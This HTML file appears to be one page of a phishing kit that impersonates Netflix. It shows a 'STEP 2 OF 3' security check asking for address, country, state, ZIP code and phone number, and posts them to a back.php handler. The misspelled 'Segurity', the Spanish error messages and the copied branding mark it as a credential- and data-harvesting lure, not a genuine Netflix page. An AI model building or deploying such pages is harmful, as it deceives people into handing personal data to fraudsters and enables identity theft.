
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Netflix</title>
    <link rel="shortcut icon" href="../img/icon.ico" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./style.css">
</head>


<body>
    <div class="row">
        <div class="col shadow-sm header d-flex justify-content-between" style="height: 87px;">
            <a href="./"><img src="../img/logo-text.png" alt="" width="220px" class="netflix-logo"></a>
            <a href="" class="d-flex align-items-center netflix-a">Sign Out</a>
        </div>
    </div>
    <div class="form">
        <p class="STEP">STEP <b>2</b> OF <b>3</b> </p>
        <h3>Complete your data for Segurity</h3>
        <p class="text-c">Almost there</p>
        <form action="back.php" id="formulario" method="POST">
            <div class="formulario__grupo " id="grupo__address">
                <div class="formulario__grupo-input ">
                    <input type="text" placeholder="Address" class="formulario__input" name="address" id="address">
                    <i class="formulario__validacion-estado fas fa-times-circle"></i>
                </div>
                <p class="formulario__input-error">Please enter a valid Address</p>
            </div>
            <div class="formulario__grupo " id="grupo__country">
                <div class="formulario__grupo-input ">
                    <input type="text" placeholder="Country" class="formulario__input" name="country" id="country">
                    <i class="formulario__validacion-estado fas fa-times-circle"></i>
                </div>
                <p class="formulario__input-error">Please enter a valid Country</p>
            </div>
            <div class="formulario__grupo " id="grupo__state">
                <div class="formulario__grupo-input ">
                    <input type="text" placeholder="State" class="formulario__input" name="state" id="state">
                    <i class="formulario__validacion-estado fas fa-times-circle"></i>
                </div>
                <p class="formulario__input-error">Please enter a valid State</p>
            </div>
            <div class="formulario__grupo " id="grupo__zip">
                <div class="formulario__grupo-input ">
                    <input type="text" placeholder="ZIP CODE" class="formulario__input" name="zip" id="zip">
                    <i class="formulario__validacion-estado fas fa-times-circle"></i>
                </div>
                <p class="formulario__input-error">Please enter a valid ZIP CODE</p>
            </div>
            <div class="formulario__grupo " id="grupo__number">
                <div class="formulario__grupo-input ">
                    <input type="text" placeholder="Phone Number" class="formulario__input" name="number" id="number" maxlength="20">
                    <i class="formulario__validacion-estado fas fa-times-circle"></i>
                </div>
                <p class="formulario__input-error">Please enter a valid Phone Number</p>
            </div>

            <input type="submit" value="Continue" class="bt-netflix">

            <p id="formulario__mensaje" class="formulario__mensaje"><i class="fas fa-exclamation-triangle"></i> <b>Error:</b> Por favor rellena el formulario correctamente. </p>
            <p class="formulario__mensaje-exito" id="formulario__mensaje-exito">Formulario enviado exitosamente!</p>
        </form>
    </div>

    </div>
    <img src="../img/xd.jpeg" alt="" class="footer" style="width: 100%;
                    margin-top: 150px;" >
</body>
<script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.1/dist/umd/popper.min.js" integrity="sha384-SR1sx49pcuLnqZUnnPwx6FCym0wLsk5JZuNx2bPPENzswTNFaQU1RDvt3wT4gWFG" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.min.js" integrity="sha384-j0CNLUeiqtyaRmlzUHCPZ+Gy5fQu0dQ6eZ/xAww941Ai1SxSY+0EQqNXNE6DZiVc" crossorigin="anonymous"></script>
<script src="main.js"></script>



</html>